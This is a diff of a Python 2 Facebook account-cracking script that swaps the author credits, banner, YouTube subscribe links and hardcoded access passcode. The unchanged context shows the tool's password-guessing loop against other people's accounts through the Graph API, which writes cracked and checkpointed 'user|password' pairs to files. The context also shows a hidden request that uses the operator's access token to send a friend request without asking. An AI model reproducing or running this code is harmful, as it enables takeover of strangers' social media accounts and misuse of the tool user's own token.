@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Codded By Jam XIDI
+#Codded By Freaked-Dude
 #Editing My Script Will Not Make You A Coder
-#Facebook : XP-TRICKER
-#INSTA : xidipakistani
-#Pakistan Cyber Expert
-#Alone Coder 
+#Facebook : FreakedDude
+#INSTA : itx_muskan_yr
+#Subscribe to my youtube Channel 
+#White Tiger Komail
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -52,36 +52,17 @@ def jalan(z):
 logo ="""
 
 
-\x1b[1;96m░██████╗░█████╗░███╗░░██╗░█████╗░
-\x1b[1;96m██╔════╝██╔══██╗████╗░██║██╔══██╗
-\x1b[1;96m╚█████╗░███████║██╔██╗██║██║░░██║
-\x1b[1;96m░╚═══██╗██╔══██║██║╚████║██║░░██║
-\x1b[1;96m██████╔╝██║░░██║██║░╚███║╚█████╔╝
-\x1b[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
 
-\x1b[1;96m──────────────────────────────────────────
-\x1b[1;96m─████████████───██████████─██████████████─
-\x1b[1;96m─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
-\x1b[1;96m─██▒▒████▒▒▒▒██─████▒▒████─██▒▒██████▒▒██─
-\x1b[1;96m─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
-\x1b[1;96m─██▒▒██──██▒▒██───██▒▒██───██▒▒██████▒▒██─
-\x1b[1;96m─██▒▒██──██▒▒██───██▒▒██───██▒▒▒▒▒▒▒▒▒▒██─
-\x1b[1;96m─██▒▒██──██▒▒██───██▒▒██───██▒▒██████▒▒██─
-\x1b[1;96m─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
-\x1b[1;96m─██▒▒████▒▒▒▒██─████▒▒████─██▒▒██──██▒▒██─
-\x1b[1;96m─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒██─██▒▒██──██▒▒██─
-\x1b[1;96m─████████████───██████████─██████──██████─
-──────────────────────────────────────────
 
 
 \x1b[1;97m--------------------------------------------------------------
-\x1b[1;94m➣  YouTube  : XP TRICKER XIDI
-\x1b[1;94m➣  Facebook : REHMAT ALI
-\x1b[1;94m➣  GIFT     : SANODIA
-\x1b[1;94m➣  Github   : https://github.com/XPXIDI
-\x1b[1;94m➣  Instagram : xidipakistani
+\x1b[1;94m➣  YouTube  : Freaked Dude
+\x1b[1;94m➣  Facebook : FreakedDude00
+\x1b[1;94m➣  GIFT     : Freaked Dude
+\x1b[1;94m➣  Github   : https://github.com/Freaked-Dude
+\x1b[1;94m➣  Instagram: itx_muskan_yr
 \x1b[1;94m➣  Note     : Having Problem? Contact Me On facebook.
-\x1b[1;94m➣  Disclamiar : This Is For Educational Purpose Only.
+\x1b[1;94m➣  Disclamiar:: This Is For Educational Purpose Only.
 \x1b[1;97m--------------------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -100,8 +81,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print logo
 
-CorrectUsername = "SANODIA"
-CorrectPassword = "HACK"
+CorrectUsername = "Cyber"
+CorrectPassword = "Tech"
 
 loop = 'true'
 while (loop == 'true'):
@@ -109,15 +90,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "\033[1;97mAccess Granted "#Dev:XP_TRICKER
+            print "\033[1;97mAccess Granted "#Dev:Freaked Dude
 	    time.sleep(1)
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+            os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+        os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
 def login():
 	os.system('clear')
 	try:
@@ -162,7 +143,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -227,7 +208,7 @@ def hop():
 	elif hack =="1":
 		super()
 	elif hack =="2":
-	        os.system('xdg-open https://m.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')
+	        os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
 	        menu()
         
 	elif hack =="0":
@@ -308,7 +289,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam
+			pass #Dev:Freaked Dude
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -322,7 +303,7 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
+					print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -338,7 +319,7 @@ def pilih_super():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
+							print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
 							cek = open("out/checkpoint.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -354,7 +335,7 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
+									print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -370,7 +351,7 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
+											print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
 											cek = open("out/Checkpoint.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -386,7 +367,7 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
+													print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
 													cek = open("out/checkpoint.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -402,7 +383,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
+															print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -418,7 +399,7 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
+																	print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
 																	cek = open("out/checkpoint.txt", "a")
                                                                                                                                         cek.write(user+"|"+pass7+"\n")
 																	cek.close()
